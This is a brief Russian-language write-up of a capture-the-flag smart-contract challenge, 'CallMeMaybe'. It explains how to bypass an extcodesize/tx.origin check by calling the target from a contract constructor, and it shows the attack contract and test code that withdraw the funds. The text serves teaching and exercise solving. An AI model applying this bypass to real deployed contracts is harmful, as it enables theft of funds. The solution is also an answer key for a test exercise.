### Модификатор callMeMaybe должен быть пройден, что возможно, если msg.sender не является контрактом. Проверка extcodesize(addr) в модификаторе возвращает 0 для обычных адресов или для контракта, вызываемого в его собственном конструкторе

### Для вывода $$$ нам нужно пройти проверку 
```
if (tx.origin == msg.sender)
```

### Вызывая функцию внутри контструктора контракта, мы сможем обойти проверку 

### Делаем просто 
```
contract Attack {
    constructor(CallMeMaybe target) payable {
        target.hereIsMyNumber();
    }
}
``` 
### и затем
```
function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        Attack attack = new Attack(instance);
        
        checkSuccess();
    }
```